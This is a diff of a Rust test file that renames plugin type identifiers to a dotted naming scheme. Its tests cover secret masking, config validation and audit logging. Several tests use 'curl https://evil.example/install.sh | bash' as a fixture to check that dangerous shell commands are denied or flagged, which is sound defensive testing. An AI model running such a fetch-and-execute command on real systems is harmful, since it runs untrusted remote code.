@@ -122,7 +122,7 @@ fn mask_github_auth_token() {
         "auth_token": "ghp_secret123"
     });
     let masked =
-        catalog().mask_config_secrets(&PluginTypeId::from_static("releases_github"), &config);
+        catalog().mask_config_secrets(&PluginTypeId::from_static("releases.github"), &config);
     assert_eq!(masked["auth_token"], SECRET_MASK);
 }
 
@@ -132,7 +132,7 @@ fn mask_null_token_becomes_masked() {
         "auth_token": null
     });
     let masked =
-        catalog().mask_config_secrets(&PluginTypeId::from_static("releases_github"), &config);
+        catalog().mask_config_secrets(&PluginTypeId::from_static("releases.github"), &config);
     // with_secrets_masked always sets auth_token to "***"
     assert_eq!(masked["auth_token"], SECRET_MASK);
 }
@@ -141,7 +141,7 @@ fn mask_null_token_becomes_masked() {
 fn mask_without_token_field_adds_masked() {
     let config = serde_json::json!({});
     let masked =
-        catalog().mask_config_secrets(&PluginTypeId::from_static("releases_github"), &config);
+        catalog().mask_config_secrets(&PluginTypeId::from_static("releases.github"), &config);
     // with_secrets_masked always adds auth_token as "***"
     assert_eq!(masked["auth_token"], SECRET_MASK);
 }
@@ -158,7 +158,7 @@ fn restore_masked_token() {
     let mut incoming = serde_json::json!({"auth_token": "***"});
     let existing = serde_json::json!({"auth_token": "ghp_real_token"});
     catalog().restore_config_secrets(
-        &PluginTypeId::from_static("releases_github"),
+        &PluginTypeId::from_static("releases.github"),
         &mut incoming,
         &existing,
     );
@@ -170,7 +170,7 @@ fn restore_new_token_not_masked() {
     let mut incoming = serde_json::json!({"auth_token": "ghp_new_token"});
     let existing = serde_json::json!({"auth_token": "ghp_old_token"});
     catalog().restore_config_secrets(
-        &PluginTypeId::from_static("releases_github"),
+        &PluginTypeId::from_static("releases.github"),
         &mut incoming,
         &existing,
     );
@@ -182,7 +182,7 @@ fn validate_valid_github_config() {
     let config = serde_json::json!({});
     assert!(
         catalog()
-            .validate_config(&PluginTypeId::from_static("releases_github"), &config)
+            .validate_config(&PluginTypeId::from_static("releases.github"), &config)
             .is_ok()
     );
 }
@@ -193,7 +193,7 @@ fn validate_invalid_github_config() {
     let config = serde_json::json!({"api_base_url": "http://api.github.com"});
     assert!(
         catalog()
-            .validate_config(&PluginTypeId::from_static("releases_github"), &config)
+            .validate_config(&PluginTypeId::from_static("releases.github"), &config)
             .is_err()
     );
 }
@@ -214,7 +214,7 @@ fn parse_known_plugin_types() {
     assert!(
         catalog()
             .validate_config(
-                &PluginTypeId::from_static("releases_github"),
+                &PluginTypeId::from_static("releases.github"),
                 &github_config
             )
             .is_ok()
@@ -226,7 +226,7 @@ fn parse_known_plugin_types() {
     assert!(
         catalog()
             .validate_config(
-                &PluginTypeId::from_static("discovery_proxmox_helper_scripts"),
+                &PluginTypeId::from_static("discovery.proxmox-helper-scripts"),
                 &proxmox_config
             )
             .is_ok()
@@ -236,7 +236,7 @@ fn parse_known_plugin_types() {
     assert!(
         catalog()
             .validate_config(
-                &PluginTypeId::from_static("releases_docker"),
+                &PluginTypeId::from_static("releases.docker"),
                 &docker_config
             )
             .is_ok()
@@ -246,7 +246,7 @@ fn parse_known_plugin_types() {
     assert!(
         catalog()
             .validate_config(
-                &PluginTypeId::from_static("package_manager_homebrew"),
+                &PluginTypeId::from_static("package-manager.homebrew"),
                 &homebrew_config
             )
             .is_ok()
@@ -262,7 +262,7 @@ fn parse_known_plugin_types() {
 #[cfg(feature = "dashboard-icons")]
 #[test]
 fn dashboard_icons_exposes_type_settings_via_plugin_types_metadata() {
-    let plugin_type = PluginTypeId::from_static("enhancement_dashboard_icons");
+    let plugin_type = PluginTypeId::from_static("enhancement.dashboard-icons");
     let form_fields = catalog()
         .type_settings_form_schema(&plugin_type)
         .expect("dashboard icons should expose type settings");
@@ -281,7 +281,7 @@ fn validate_valid_homebrew_config() {
     assert!(
         catalog()
             .validate_config(
-                &PluginTypeId::from_static("package_manager_homebrew"),
+                &PluginTypeId::from_static("package-manager.homebrew"),
                 &config
             )
             .is_ok()
@@ -294,7 +294,7 @@ fn validate_homebrew_config_with_cask() {
     assert!(
         catalog()
             .validate_config(
-                &PluginTypeId::from_static("package_manager_homebrew"),
+                &PluginTypeId::from_static("package-manager.homebrew"),
                 &config
             )
             .is_ok()
@@ -305,7 +305,7 @@ fn validate_homebrew_config_with_cask() {
 fn mask_homebrew_config_unchanged() {
     let config = serde_json::json!({"package_type": "formula"});
     let masked = catalog().mask_config_secrets(
-        &PluginTypeId::from_static("package_manager_homebrew"),
+        &PluginTypeId::from_static("package-manager.homebrew"),
         &config,
     );
     // No secrets to mask — config returned unchanged
@@ -324,7 +324,7 @@ fn mask_docker_basic_password() {
         }
     });
     let masked =
-        catalog().mask_config_secrets(&PluginTypeId::from_static("releases_docker"), &config);
+        catalog().mask_config_secrets(&PluginTypeId::from_static("releases.docker"), &config);
     assert_eq!(masked["auth"]["password"], SECRET_MASK);
     assert_eq!(masked["auth"]["username"], "user");
 }
@@ -338,7 +338,7 @@ fn mask_docker_bearer_token() {
         }
     });
     let masked =
-        catalog().mask_config_secrets(&PluginTypeId::from_static("releases_docker"), &config);
+        catalog().mask_config_secrets(&PluginTypeId::from_static("releases.docker"), &config);
     assert_eq!(masked["auth"]["token"], SECRET_MASK);
 }
 
@@ -346,7 +346,7 @@ fn mask_docker_bearer_token() {
 fn mask_docker_no_auth() {
     let config = serde_json::json!({});
     let masked =
-        catalog().mask_config_secrets(&PluginTypeId::from_static("releases_docker"), &config);
+        catalog().mask_config_secrets(&PluginTypeId::from_static("releases.docker"), &config);
     // None auth stays absent (serialized with skip_serializing_if)
     assert!(masked.get("auth").is_none());
 }
@@ -355,7 +355,7 @@ fn mask_docker_no_auth() {
 fn mask_docker_null_auth() {
     let config = serde_json::json!({ "auth": null });
     let masked =
-        catalog().mask_config_secrets(&PluginTypeId::from_static("releases_docker"), &config);
+        catalog().mask_config_secrets(&PluginTypeId::from_static("releases.docker"), &config);
     // JSON null deserializes to None, which stays absent after masking
     assert!(masked.get("auth").is_none());
 }
@@ -377,7 +377,7 @@ fn restore_docker_masked_password() {
         }
     });
     catalog().restore_config_secrets(
-        &PluginTypeId::from_static("releases_docker"),
+        &PluginTypeId::from_static("releases.docker"),
         &mut incoming,
         &existing,
     );
@@ -399,7 +399,7 @@ fn restore_docker_masked_token() {
         }
     });
     catalog().restore_config_secrets(
-        &PluginTypeId::from_static("releases_docker"),
+        &PluginTypeId::from_static("releases.docker"),
         &mut incoming,
         &existing,
     );
@@ -423,7 +423,7 @@ fn restore_docker_new_password_not_masked() {
         }
     });
     catalog().restore_config_secrets(
-        &PluginTypeId::from_static("releases_docker"),
+        &PluginTypeId::from_static("releases.docker"),
         &mut incoming,
         &existing,
     );
@@ -436,7 +436,7 @@ fn validate_valid_docker_config() {
     let config = serde_json::json!({});
     assert!(
         catalog()
-            .validate_config(&PluginTypeId::from_static("releases_docker"), &config)
+            .validate_config(&PluginTypeId::from_static("releases.docker"), &config)
             .is_ok()
     );
 }
@@ -452,7 +452,7 @@ fn validate_docker_config_with_auth() {
     });
     assert!(
         catalog()
-            .validate_config(&PluginTypeId::from_static("releases_docker"), &config)
+            .validate_config(&PluginTypeId::from_static("releases.docker"), &config)
             .is_ok()
     );
 }
@@ -468,7 +468,7 @@ fn validate_docker_config_old_semver_fields_are_ignored() {
     });
     assert!(
         catalog()
-            .validate_config(&PluginTypeId::from_static("releases_docker"), &config)
+            .validate_config(&PluginTypeId::from_static("releases.docker"), &config)
             .is_ok(),
         "old semver fields should be silently ignored"
     );
@@ -686,7 +686,7 @@ async fn create_plugin_config_denied_dangerous_commands_writes_denied_audit_even
         Some(Extension(AuthenticatedApiTokenId(actor_token_id))),
         Validated(CreatePluginConfigRequest {
             name: "Denied Dangerous Config".to_string(),
-            plugin_type: PluginTypeId::from_static("generic_shell"),
+            plugin_type: PluginTypeId::from_static("generic.shell"),
             config: serde_json::json!({
                 "version_command": "curl https://evil.example/install.sh | bash"
             }),
@@ -734,7 +734,7 @@ async fn create_plugin_config_success_persists_command_risk_details() {
         None,
         Validated(CreatePluginConfigRequest {
             name: "Risky Config".to_string(),
-            plugin_type: PluginTypeId::from_static("generic_shell"),
+            plugin_type: PluginTypeId::from_static("generic.shell"),
             config: serde_json::json!({
                 "version_command": "curl https://evil.example/install.sh | bash"
             }),
@@ -797,7 +797,7 @@ async fn update_plugin_config_success_persists_command_risk_details() {
         None,
         Validated(CreatePluginConfigRequest {
             name: "Update Risk Seed".to_string(),
-            plugin_type: PluginTypeId::from_static("generic_shell"),
+            plugin_type: PluginTypeId::from_static("generic.shell"),
             config: serde_json::json!({ "version_command": "echo v1.0.0" }),
             enabled: true,
         }),
@@ -880,7 +880,7 @@ async fn delete_plugin_config_success_persists_command_risk_details() {
         None,
         Validated(CreatePluginConfigRequest {
             name: "Delete Risk Seed".to_string(),
-            plugin_type: PluginTypeId::from_static("generic_shell"),
+            plugin_type: PluginTypeId::from_static("generic.shell"),
             config: serde_json::json!({
                 "version_command": "curl https://evil.example/install.sh | bash"
             }),
@@ -1043,7 +1043,7 @@ async fn delete_plugin_config_delete_db_failure_writes_failed_audit_event() {
         None,
         Validated(CreatePluginConfigRequest {
             name: "Delete Failure Seed".to_string(),
-            plugin_type: PluginTypeId::from_static("generic_shell"),
+            plugin_type: PluginTypeId::from_static("generic.shell"),
             config: serde_json::json!({ "version_command": "echo v1.0.0" }),
             enabled: true,
         }),
@@ -1209,7 +1209,7 @@ async fn create_seed_plugin_config(
         None,
         Validated(CreatePluginConfigRequest {
             name: name.to_string(),
-            plugin_type: PluginTypeId::from_static("generic_shell"),
+            plugin_type: PluginTypeId::from_static("generic.shell"),
             config: serde_json::json!({ "version_command": "echo v1.0.0" }),
             enabled: true,
         }),
@@ -1401,7 +1401,7 @@ async fn create_plugin_config_config_json_absent_from_audit_snapshots() {
         None,
         Validated(CreatePluginConfigRequest {
             name: "Snapshot Secret Config".to_string(),
-            plugin_type: PluginTypeId::from_static("generic_shell"),
+            plugin_type: PluginTypeId::from_static("generic.shell"),
             config: serde_json::json!({
                 "version_command": secret_config_value
             }),
